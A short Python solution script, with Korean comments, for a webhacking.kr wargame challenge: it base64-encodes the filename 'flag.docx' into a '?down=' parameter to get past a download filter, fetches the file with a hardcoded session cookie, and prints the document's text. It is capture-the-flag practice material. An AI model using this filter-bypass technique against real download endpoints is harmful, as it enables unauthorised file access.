from docx import Document
import base64
import requests

URL = "https://webhacking.kr/challenge/web-20"
URI = "/?down="
PHPSESSID = '2iti1mqblclscqcnp08irp82q2'

cookie = {'PHPSESSID':PHPSESSID}

file_name = "flag.docx"
PAYLOAD = base64.b64encode(file_name.encode('utf-8')).decode('utf-8')

print(PAYLOAD)

# 풀이
# 1. ?down= 부분에 flag.docx 문자열을 base64로 바꿔서 호출
# 2. stream 모드로 다운로드한 파일을 저장해서 플래그 확인

try:
    resp = requests.get(URL + URI + PAYLOAD, cookies=cookie, stream=True)
    resp.raise_for_status()

    with open("./" + file_name, "wb") as f:
        for chunk in resp.iter_content(chunk_size=8192):
            f.write(chunk)
    
    print(f"File download successed : {file_name}")

    document = Document('./' + file_name)

    contents = []
    
    for paragraph in document.paragraphs:
        contents.append(paragraph.text)
    
    print("\n".join(contents))

except requests.exceptions.RequestException as e:
    print(f"파일 다운로드 중 오류 발생 : {e}")